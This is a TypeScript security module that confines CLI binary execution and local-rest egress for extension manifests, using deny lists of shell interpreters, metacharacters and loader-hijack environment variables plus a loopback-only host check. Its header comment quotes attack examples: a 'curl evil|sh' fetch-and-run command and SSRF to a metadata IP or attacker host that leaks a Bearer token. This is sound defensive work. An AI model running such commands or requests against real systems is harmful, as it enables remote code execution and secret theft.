/**
 * TRANSPORT CONFINEMENT POLICY (m4sec-trans) — shared egress/exec policy for the
 * security-sensitive `cli` and `local-rest` transports.
 *
 * Background (M4 security review, must-fix #2 + #3): once ANY extension can register
 * a manifest, an attacker-authored `route` can:
 *   - (#2 cli RCE) name `bin:"/bin/sh", args:["-c","curl evil|sh"]` and get arbitrary
 *     code execution — the transport spawned `route.bin` verbatim with no allow-list.
 *   - (#3 local-rest SSRF + secret-redirect) set `baseUrl:"http://169.254.169.254/…"`
 *     or `"http://attacker.example"` and the transport would issue the request AND
 *     attach a resolved secret as a Bearer token to that attacker host.
 *
 * This module is the SINGLE source of truth for the two confinement decisions:
 *   - `isBinaryAllowed(bin, policy)` — the cli binary policy (default-deny).
 *   - `isAllowedHost(url, policy)`   — the local-rest egress policy (loopback-only +
 *     optional user-confirmed host allow-list).
 *
 * SEAM FOR m4sec-auth (register-time user-confirm): the validators here are pure and
 * side-effect-free so the register path can call them UP FRONT (before an entry ever
 * enters the registry) to (a) reject a manifest whose route is structurally unsafe and
 * (b) surface the per-extension allow-list (`CliBinaryPolicy.allowList` /
 * `RestHostPolicy.allowedHosts`) for the user to confirm. The allow-list data lives on
 * the open `route` bag (see `cliPolicyFromRoute` / `restPolicyFromRoute`), NOT on the
 * frozen protocol types.
 *
 * All denials map onto the CLOSED `ErrorCode` union (protocol/types.ts §8):
 *   - cli binary denial      → `transport_error` (no dedicated policy code in the union).
 *   - local-rest host denial → `host_forbidden`  (same code the gateway uses for the
 *                              DNS-rebinding / non-loopback Host guard — exact semantics).
 */

// ============================================================================
// CLI BINARY POLICY (#2)
// ============================================================================

/**
 * The per-extension cli binary policy. Surfaced for user confirmation at register
 * time (m4sec-auth wires the confirm UI; this module owns the shape + enforcement).
 *
 * MODEL (default-deny, defense-in-depth):
 *  - The HARD-DENY rules (path separators, absolute paths, shell interpreters, shell
 *    metacharacters / chaining) are UNCONDITIONAL — a bin matching any of them is
 *    rejected EVEN IF it appears in `allowList`. An allow-list entry can never grant
 *    `/bin/sh`. This is the property that closes the RCE.
 *  - A bare, structurally-safe command name (e.g. `git`, `echo`) is allowed when it is
 *    on `allowList`, OR — when no `allowList` is configured for the extension — when it
 *    passes the structural safety check. The allow-list is therefore the mechanism by
 *    which the user CONFIRMS a specific risky-but-needed bare bin; it never widens past
 *    the hard-deny floor.
 *
 * SECURITY-SENSITIVE FIELDS (route.bin / route.args / route.env / route.cwd):
 *  - `bin`  — policed here (the exec target).
 *  - `args` — never used to assemble a shell command line; Plexus spawns the bin with
 *    an argv ARRAY (no shell), so `args` cannot inject a second command. `isBinaryAllowed`
 *    still rejects a `bin` that is a shell interpreter so `["-c", "..."]` has no shell to
 *    feed. Token substitution into args is plain string replacement into argv slots.
 *  - `env`  — must NOT inject sensitive interpreter-hijack vars (PATH, LD_PRELOAD,
 *    DYLD_*, NODE_OPTIONS, …). `sanitizeCliEnv` strips them; see `BLOCKED_ENV_VARS`.
 *  - `cwd`  — an absolute cwd is allowed (a bin may legitimately run in a fixed dir) but
 *    is reported as security-sensitive; `cliPolicyFromRoute` carries it through so the
 *    register-time confirm can show it. There is no cwd-based escape because the bin
 *    itself is allow-list-gated and never a shell.
 */
export interface CliBinaryPolicy {
  /**
   * The explicit, user-confirmed bare binary names this extension may spawn. When
   * present and non-empty, a bin must be a member (after passing the hard-deny check).
   * When ABSENT/empty, a structurally-safe bare bin is permitted (back-compat for the
   * first-party `echo`/`true` style usage), but the hard-deny floor still applies.
   */
  allowList?: string[];
}

/** Why a bin was denied (for the register-time confirm UI + audit-safe messaging). */
export type CliDenyReason =
  | "absolute_path"
  | "path_separator"
  | "shell_interpreter"
  | "shell_metacharacter"
  | "empty"
  | "not_in_allow_list";

export interface CliBinaryDecision {
  allowed: boolean;
  /** Present iff !allowed. */
  reason?: CliDenyReason;
  /** Human-facing, audit-safe explanation. */
  message?: string;
}

/**
 * Shell interpreters + script runtimes that can execute arbitrary code from an arg
 * string. NEVER spawnable, even if allow-listed. Matched case-insensitively against
 * the bare command name (extension stripped) so `bash`, `Bash`, `python3`, `node.exe`
 * are all caught.
 */
const SHELL_INTERPRETERS = new Set<string>([
  "sh",
  "bash",
  "zsh",
  "fish",
  "dash",
  "ksh",
  "csh",
  "tcsh",
  "ash",
  "pwsh",
  "powershell",
  "cmd",
  "command",
  "python",
  "python2",
  "python3",
  "perl",
  "ruby",
  "node",
  "deno",
  "bun",
  "php",
  "lua",
  "tclsh",
  "osascript",
  "env", // `env FOO=bar /bin/sh` — a classic indirection; deny outright.
  "xargs", // `xargs sh -c` indirection.
  "nice",
  "nohup",
  "timeout",
  "stdbuf",
  "setsid",
  "eval",
  "exec",
]);

/** Shell metacharacters / chaining tokens. Their presence in a bin name is a red flag. */
const SHELL_METACHAR = /[;&|`$(){}<>\n\r\t*?!\\"'\s]/;

/**
 * Env var names that hijack the loader / interpreter and must never be injected via
 * `route.env`. (PATH is included: an attacker-controlled PATH turns an allow-listed
 * bare `git` into an attacker binary.)
 */
export const BLOCKED_ENV_VARS = new Set<string>([
  "PATH",
  "LD_PRELOAD",
  "LD_LIBRARY_PATH",
  "LD_AUDIT",
  "DYLD_INSERT_LIBRARIES",
  "DYLD_LIBRARY_PATH",
  "DYLD_FRAMEWORK_PATH",
  "NODE_OPTIONS",
  "BASH_ENV",
  "ENV",
  "PYTHONSTARTUP",
  "PERL5OPT",
  "RUBYOPT",
  "IFS",
  "PROMPT_COMMAND",
]);

/** Strip the directory + extension from a command name → the bare comparable name. */
function bareName(bin: string): string {
  const lastSlash = Math.max(bin.lastIndexOf("/"), bin.lastIndexOf("\\"));
  const base = lastSlash >= 0 ? bin.slice(lastSlash + 1) : bin;
  const dot = base.lastIndexOf(".");
  // Strip a trailing extension (.exe/.cmd/.bat/.sh/...) for the interpreter compare.
  return (dot > 0 ? base.slice(0, dot) : base).toLowerCase();
}

/**
 * THE CLI BINARY POLICY DECISION. Pure + side-effect-free so the register path can
 * call it up front. Default-deny with an unconditional hard-deny floor.
 */
export function isBinaryAllowed(bin: string, policy?: CliBinaryPolicy): CliBinaryDecision {
  if (typeof bin !== "string" || bin.trim().length === 0) {
    return { allowed: false, reason: "empty", message: "cli: empty binary name" };
  }
  const raw = bin.trim();

  // ── HARD-DENY FLOOR (unconditional; an allow-list entry can never override) ──

  // Absolute paths (POSIX `/usr/bin/x`, Windows `C:\x`, UNC `\\host\x`).
  if (raw.startsWith("/") || /^[A-Za-z]:[\\/]/.test(raw) || raw.startsWith("\\\\")) {
    return { allowed: false, reason: "absolute_path", message: "cli: absolute binary paths are not allowed" };
  }
  // Any remaining path separator → a relative path escape (e.g. `./x`, `../x`, `a/b`).
  if (raw.includes("/") || raw.includes("\\")) {
    return { allowed: false, reason: "path_separator", message: "cli: binary must be a bare command name (no path separators)" };
  }
  // Shell metacharacters / whitespace / chaining tokens embedded in the name.
  if (SHELL_METACHAR.test(raw)) {
    return { allowed: false, reason: "shell_metacharacter", message: "cli: binary name contains shell metacharacters" };
  }
  // Shell interpreters + script runtimes — never spawnable.
  if (SHELL_INTERPRETERS.has(bareName(raw))) {
    return { allowed: false, reason: "shell_interpreter", message: `cli: '${raw}' is a shell/interpreter and is not allowed` };
  }

  // ── ALLOW-LIST GATE ──
  const allowList = policy?.allowList;
  if (allowList && allowList.length > 0) {
    if (!allowList.includes(raw)) {
      return { allowed: false, reason: "not_in_allow_list", message: `cli: '${raw}' is not in the extension's binary allow-list` };
    }
  }
  // No allow-list configured ⇒ a structurally-safe bare bin is permitted (back-compat).
  return { allowed: true };
}

/**
 * Read the cli policy off the open `route` bag. The allow-list field is `allowedBins`
 * (a `string[]`); anything else is ignored. Lives here (not on the frozen types) so the
 * protocol contract is untouched.
 */
export function cliPolicyFromRoute(route: Record<string, unknown> | undefined): CliBinaryPolicy {
  const allow = route?.["allowedBins"];
  if (Array.isArray(allow)) {
    return { allowList: allow.filter((b): b is string => typeof b === "string") };
  }
  return {};
}

/**
 * Drop loader/interpreter-hijacking vars from a `route.env` map before it reaches the
 * spawn. Returns a NEW object; never mutates the input. Comparison is case-insensitive
 * for the loader vars (env names are case-sensitive on POSIX but an attacker could try
 * `Path`/`path` on case-insensitive resolvers, so we block by upper-cased name).
 */
export function sanitizeCliEnv(
  env: Record<string, string> | undefined,
): Record<string, string> | undefined {
  if (!env) return undefined;
  const out: Record<string, string> = {};
  for (const [k, v] of Object.entries(env)) {
    if (BLOCKED_ENV_VARS.has(k.toUpperCase())) continue;
    out[k] = v;
  }
  return out;
}

// ============================================================================
// LOCAL-REST EGRESS POLICY (#3)
// ============================================================================

/**
 * The per-extension local-rest egress policy. By default Plexus may ONLY reach a
 * loopback authority (127.0.0.1 / localhost / [::1], any port) — the same property the
 * gateway's own Host guard enforces. A user MAY confirm additional explicit hosts at
 * register time; those go in `allowedHosts` (host[:port] or full origin) and are the
 * ONLY non-loopback destinations a secret may ever be attached to.
 */
export interface RestHostPolicy {
  /**
   * User-confirmed non-loopback hosts this extension may reach. Each entry is a host
   * (e.g. `"api.internal.example"`) or host:port. Matched against the URL's hostname
   * (and port when the entry pins one). Loopback is ALWAYS allowed regardless.
   */
  allowedHosts?: string[];
}

export type RestDenyReason = "malformed_url" | "non_loopback_host" | "not_in_host_allow_list";

export interface RestHostDecision {
  allowed: boolean;
  /** True iff the resolved authority is a loopback address (drives secret-attach gating). */
  loopback: boolean;
  reason?: RestDenyReason;
  message?: string;
}

/** Is a bare hostname (no port) a loopback authority? Exact match — no substrings. */
function isLoopbackHost(hostname: string): boolean {
  const h = hostname.toLowerCase();
  if (h === "localhost") return true;
  if (h === "::1" || h === "[::1]") return true;
  if (h === "0:0:0:0:0:0:0:1") return true;
  // IPv4 loopback /8: 127.0.0.0/8 is entirely loopback.
  const m = h.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (m) {
    const oct = m.slice(1).map((n) => Number(n));
    if (oct.every((n) => n >= 0 && n <= 255) && oct[0] === 127) return true;
  }
  return false;
}

/** Normalize an allow-list entry + the URL to comparable host / host:port forms. */
function hostMatchesAllow(url: URL, entry: string): boolean {
  const e = entry.trim().toLowerCase();
  if (e.length === 0) return false;
  // Allow a full origin entry ("http://api.example:8080") by parsing it.
  let entryHost = e;
  let entryPort = "";
  try {
    if (e.includes("://")) {
      const u = new URL(e);
      entryHost = u.hostname.toLowerCase();
      entryPort = u.port;
    } else if (e.includes(":") && !e.startsWith("[")) {
      const idx = e.lastIndexOf(":");
      entryHost = e.slice(0, idx);
      entryPort = e.slice(idx + 1);
    }
  } catch {
    return false;
  }
  const urlHost = url.hostname.toLowerCase();
  if (urlHost !== entryHost) return false;
  // If the allow-list entry pins a port, the URL's port must match exactly.
  if (entryPort.length > 0 && url.port !== entryPort) return false;
  return true;
}

/**
 * THE LOCAL-REST EGRESS DECISION. Pure + side-effect-free so the register path can
 * validate `route.baseUrl` up front. Loopback is always allowed; a non-loopback host is
 * allowed ONLY if it (exactly) matches a user-confirmed `allowedHosts` entry. A secret
 * may be attached ONLY when `loopback || allowed-by-list` — see the transport's gate.
 */
export function isAllowedHost(rawUrl: string, policy?: RestHostPolicy): RestHostDecision {
  let url: URL;
  try {
    url = new URL(rawUrl);
  } catch {
    return { allowed: false, loopback: false, reason: "malformed_url", message: `local-rest: malformed base URL` };
  }
  const loopback = isLoopbackHost(url.hostname);
  if (loopback) {
    return { allowed: true, loopback: true };
  }
  const allowed = policy?.allowedHosts?.some((h) => hostMatchesAllow(url, h)) ?? false;
  if (allowed) {
    return { allowed: true, loopback: false };
  }
  return {
    allowed: false,
    loopback: false,
    reason: policy?.allowedHosts && policy.allowedHosts.length > 0 ? "not_in_host_allow_list" : "non_loopback_host",
    message: `local-rest: host '${url.hostname}' is not a loopback authority and is not in the host allow-list`,
  };
}

/** Read the local-rest egress policy off the open `route` bag (`allowedHosts: string[]`). */
export function restPolicyFromRoute(route: Record<string, unknown> | undefined): RestHostPolicy {
  const allow = route?.["allowedHosts"];
  if (Array.isArray(allow)) {
    return { allowedHosts: allow.filter((h): h is string => typeof h === "string") };
  }
  return {};
}
